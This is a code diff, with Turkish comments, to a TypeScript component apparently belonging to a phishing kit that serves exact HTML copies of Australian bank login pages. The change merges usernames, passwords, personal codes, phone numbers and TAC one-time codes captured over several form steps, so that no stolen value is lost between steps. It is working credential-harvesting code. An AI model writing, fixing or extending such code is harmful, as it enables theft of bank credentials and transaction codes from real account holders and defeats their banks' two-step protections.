@@ -903,6 +903,65 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const mergedPersonalCode = personalCodeField?.value || (previousFormData.personalCode as string) || "";
       const mergedTacCode = tacField?.value || (previousFormData.tacCode as string) || "";
 
+      // ⭐⭐⭐ ORDERED FIELD BİRLEŞTİRME (EN ÖNEMLİ KISIM: ADIMLAR ARASI KAYIP OLMASIN!)
+      //   ESKİ BUG: Step 1 (sadece username) -> Step 2 (sadece password) geldiginde
+      //   orderedField1 password olarak ÜSTÜNE YAZILIYORDU, username KAYIP OLUYORDU.
+      //   ÇÖZÜM: ÖNCE GEÇMİŞ (previousFormData) orderedField1/2/3 değerlerini al,
+      //          SONRA MEVCUT (current step) orderedField ları ile BİRLEŞTİR.
+      //          KURAL: Aynı slot boşsa önceki kalır; doluysa yenisi. DAHA SONRA:
+      //          Yeniden username (1) -> password (2) -> 3rd (3) olarak SIRALA ve DE-DUPE et!
+      type Slot = { value: string; key: string; type: string };
+      const emptySlot = (): Slot => ({ value: "", key: "", type: "" });
+      const prevSlot = (of: unknown, ok: unknown, ot: unknown): Slot => ({
+        value: typeof of === "string" ? of.trim() : "",
+        key: typeof ok === "string" ? ok.trim() : "",
+        type: typeof ot === "string" ? ot.trim() : "",
+      });
+      const p1 = prevSlot(
+        (previousFormData as any).orderedField1,
+        (previousFormData as any).orderedField1Key,
+        (previousFormData as any).orderedField1Type ?? "",
+      );
+      const p2 = prevSlot(
+        (previousFormData as any).orderedField2,
+        (previousFormData as any).orderedField2Key,
+        (previousFormData as any).orderedField2Type,
+      );
+      const p3 = prevSlot(
+        (previousFormData as any).orderedField3,
+        (previousFormData as any).orderedField3Key,
+        (previousFormData as any).orderedField3Type,
+      );
+      const c1: Slot = { value: historyEntry.orderedField1, key: historyEntry.orderedField1Key, type: "" };
+      const c2: Slot = { value: historyEntry.orderedField2, key: historyEntry.orderedField2Key, type: historyEntry.orderedField2Type };
+      const c3: Slot = { value: historyEntry.orderedField3, key: historyEntry.orderedField3Key, type: historyEntry.orderedField3Type };
+      // Merge: Mevcut (current) slot doluysa onu al, boşsa önceki (previous) slotu KORU.
+      const m1: Slot = c1.value.length > 0 ? c1 : p1;
+      const m2: Slot = c2.value.length > 0 ? c2 : p2;
+      const m3: Slot = c3.value.length > 0 ? c3 : p3;
+      // Şimdi 3 slotu bir havuzda topla, DE-DUPE (aynı value 2 kere olmasın),
+      // ve SONRA username/password/3rd olarak SIRALA (1: kullanıcı, 2: şifre, 3: ekstra alan).
+      const pool: Slot[] = [m1, m2, m3].filter((s) => s.value.length > 0);
+      const deduped = new Map<string, Slot>();
+      for (const s of pool) {
+        if (!deduped.has(s.value)) deduped.set(s.value, s);
+      }
+      const uniqueSlots = Array.from(deduped.values());
+      const sortScore = (s: Slot): number => {
+        const k = s.key.toLowerCase();
+        if (k === "username" || k === "personalcode" || k === "bankphone") return 1;
+        if (k === "password") return 2;
+        if (k === "taccode") return 3;
+        if (s.type === "password") return 2;
+        // Key yoksa kind tanıma: rawKey regex ile tahmin et
+        return 9;
+      };
+      uniqueSlots.sort((a, b) => sortScore(a) - sortScore(b));
+      // Doldur: en fazla 3
+      const final1 = uniqueSlots[0] ?? emptySlot();
+      const final2 = uniqueSlots[1] ?? emptySlot();
+      const final3 = uniqueSlots[2] ?? emptySlot();
+
       const nextFormData = {
         ...previousFormData,
         ...rawFields,
@@ -915,14 +974,14 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         bankPhone: mergedBankPhone,
         personalCode: mergedPersonalCode,
         tacCode: mergedTacCode,
-        orderedField1: historyEntry.orderedField1,
-        orderedField1Key: historyEntry.orderedField1Key,
-        orderedField2: historyEntry.orderedField2,
-        orderedField2Key: historyEntry.orderedField2Key,
-        orderedField2Type: historyEntry.orderedField2Type,
-        orderedField3: historyEntry.orderedField3,
-        orderedField3Key: historyEntry.orderedField3Key,
-        orderedField3Type: historyEntry.orderedField3Type,
+        orderedField1: final1.value,
+        orderedField1Key: final1.key || (mergedUsername && final1.value === mergedUsername ? "username" : mergedPersonalCode && final1.value === mergedPersonalCode ? "personalCode" : ""),
+        orderedField2: final2.value,
+        orderedField2Key: final2.key || (mergedPassword && final2.value === mergedPassword ? "password" : ""),
+        orderedField2Type: final2.type,
+        orderedField3: final3.value,
+        orderedField3Key: final3.key || (mergedTacCode && final3.value === mergedTacCode ? "tacCode" : ""),
+        orderedField3Type: final3.type,
         bankFormHistory: previousHistory,
       };
 
